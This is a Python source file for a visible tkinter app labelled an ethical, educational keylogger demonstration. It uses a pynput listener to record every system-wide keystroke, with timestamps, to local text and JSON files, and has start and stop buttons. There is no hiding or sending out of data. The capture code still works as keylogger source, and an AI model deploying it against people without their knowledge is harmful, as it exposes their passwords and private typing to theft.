import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json
import time

# ---------------- GLOBAL VARIABLES ----------------
key_list = []
key_strokes = ""
listener = None
logging_active = False

# ---------------- FILE UPDATE FUNCTIONS ----------------
def update_txt_file(text):
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(text)

def update_json_file(data):
    with open("logs.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

# ---------------- KEYBOARD EVENTS ----------------
def on_press(key):
    global key_strokes

    key = str(key)

    # -------- CLEAN KEY MAPPING --------
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift' or key == 'Key.shift_r':
        key = ''
    elif key == 'Key.backspace':
        key = '<'
    elif key.startswith('Key.'):
        key = f'[{key}]'
    else:
        key = key.replace("'", "")

    if key:
        key_strokes += key
        key_list.append({
            "Key": key,
            "Time": time.ctime()
        })
        update_txt_file(key)
        update_json_file(key_list)

def on_release(key):
    if not logging_active:
        return False

# ---------------- CONTROL FUNCTIONS ----------------
def start_logging():
    global listener, logging_active

    if logging_active:
        messagebox.showinfo("Info", "Keylogging is already running.")
        return

    logging_active = True
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_label.config(text="Status: Logging Started", fg="green")

def stop_logging():
    global listener, logging_active

    if listener:
        logging_active = False
        listener.stop()
        status_label.config(text="Status: Logging Stopped", fg="red")
        messagebox.showinfo("Stopped", "Keylogging stopped successfully.")

def exit_app():
    stop_logging()
    root.destroy()

# ---------------- GUI SETUP ----------------
root = tk.Tk()
root.title("Ethical Keylogger Demonstration")
root.geometry("450x320")
root.resizable(False, False)

title_label = tk.Label(
    root,
    text="Keystroke Logging Demonstration",
    font=("Arial", 14, "bold")
)
title_label.pack(pady=10)

info_label = tk.Label(
    root,
    text="Educational use only.\nUser consent is required.",
    fg="gray"
)
info_label.pack()

start_btn = tk.Button(
    root,
    text="Start Logging",
    width=25,
    bg="#4CAF50",
    fg="white",
    command=start_logging
)
start_btn.pack(pady=10)

stop_btn = tk.Button(
    root,
    text="Stop Logging",
    width=25,
    bg="#F44336",
    fg="white",
    command=stop_logging
)
stop_btn.pack(pady=5)

exit_btn = tk.Button(
    root,
    text="Exit",
    width=25,
    command=exit_app
)
exit_btn.pack(pady=10)

status_label = tk.Label(
    root,
    text="Status: Idle",
    fg="blue"
)
status_label.pack(pady=10)

root.mainloop()
